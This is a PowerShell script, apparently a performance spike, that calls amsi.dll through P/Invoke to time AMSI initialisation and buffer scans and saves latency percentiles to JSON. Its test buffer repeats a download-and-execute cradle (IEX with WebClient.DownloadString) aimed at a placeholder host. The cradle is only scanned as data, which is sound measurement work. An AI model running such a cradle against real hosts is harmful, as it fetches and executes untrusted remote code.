# Spike 3: AMSI latency measurement (non-admin, P/Invoke into amsi.dll)
# Measures AmsiInitialize + per-scan latency of AmsiScanBuffer on script-like buffers.
$ErrorActionPreference = 'Stop'

$src = @'
using System;
using System.Runtime.InteropServices;

public static class Amsi {
    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiInitialize(string appName, out IntPtr ctx);

    [DllImport("amsi.dll")]
    public static extern void AmsiUninitialize(IntPtr ctx);

    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiOpenSession(IntPtr ctx, out IntPtr session);

    [DllImport("amsi.dll")]
    public static extern void AmsiCloseSession(IntPtr ctx, IntPtr session);

    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiScanBuffer(IntPtr ctx, byte[] buffer, uint length, string contentName, IntPtr session, out int result);

    [DllImport("amsi.dll", CharSet = CharSet.Unicode)]
    public static extern int AmsiScanString(IntPtr ctx, string str, string contentName, IntPtr session, out int result);
}
'@

Add-Type -TypeDefinition $src -Language CSharp | Out-Null

$swInit = [Diagnostics.Stopwatch]::StartNew()
$ctx = [IntPtr]::Zero
$hr = [Amsi]::AmsiInitialize('aidf-spike3', [ref]$ctx)
$swInit.Stop()
if ($hr -ne 0 -or $ctx -eq [IntPtr]::Zero) { throw "AmsiInitialize failed hr=0x{0:X8}" -f $hr }

$session = [IntPtr]::Zero
$hrSess = [Amsi]::AmsiOpenSession($ctx, [ref]$session)

function New-ScriptBuffer([int]$size) {
    $head = 'IEX (New-Object Net.WebClient).DownloadString("http://example.invalid/a.ps1"); $x = 1;'
    $sb = New-Object System.Text.StringBuilder
    while ($sb.Length -lt $size) { [void]$sb.Append($head) }
    $s = $sb.ToString().Substring(0, $size)
    return [Text.Encoding]::UTF8.GetBytes($s)
}

$results = @{}
foreach ($size in 1024, 8192, 65536) {
    $buf = New-ScriptBuffer $size
    $res = 0
    # warm-up
    [void][Amsi]::AmsiScanBuffer($ctx, $buf, [uint32]$buf.Length, 'aidf-spike3', $session, [ref]$res)
    $n = 200
    $times = New-Object double[] $n
    $sw = [Diagnostics.Stopwatch]::StartNew()
    for ($i = 0; $i -lt $n; $i++) {
        $t0 = $sw.ElapsedTicks
        [void][Amsi]::AmsiScanBuffer($ctx, $buf, [uint32]$buf.Length, 'aidf-spike3', $session, [ref]$res)
        $times[$i] = ($sw.ElapsedTicks - $t0) * 1000.0 / [Diagnostics.Stopwatch]::Frequency  # microseconds
    }
    $sorted = $times | Sort-Object
    $p = { param($q) $sorted[[int][math]::Floor(($sorted.Count - 1) * $q)] }
    $results["size_$size"] = [pscustomobject]@{
        bytes      = $size
        scans      = $n
        result_code = $res
        mean_us    = [math]::Round(($times | Measure-Object -Average).Average, 2)
        p50_us     = [math]::Round((& $p 0.50), 2)
        p95_us     = [math]::Round((& $p 0.95), 2)
        p99_us     = [math]::Round((& $p 0.99), 2)
        max_us     = [math]::Round($sorted[-1], 2)
    }
}

[Amsi]::AmsiCloseSession($ctx, $session)
[Amsi]::AmsiUninitialize($ctx)

$out = [pscustomobject]@{
    measured_at      = (Get-Date).ToString('o')
    host             = $env:COMPUTERNAME
    os_build         = (Get-CimInstance Win32_OperatingSystem).BuildNumber
    amsi_dll_version = (Get-Item C:\Windows\System32\amsi.dll).VersionInfo.FileVersion
    init_ms          = [math]::Round($swInit.Elapsed.TotalMilliseconds, 3)
    open_session_hr  = ('0x{0:X8}' -f $hrSess)
    scans            = $results
}
$out | ConvertTo-Json -Depth 5 | Tee-Object -FilePath (Join-Path $PSScriptRoot 'amsi_latency.json')
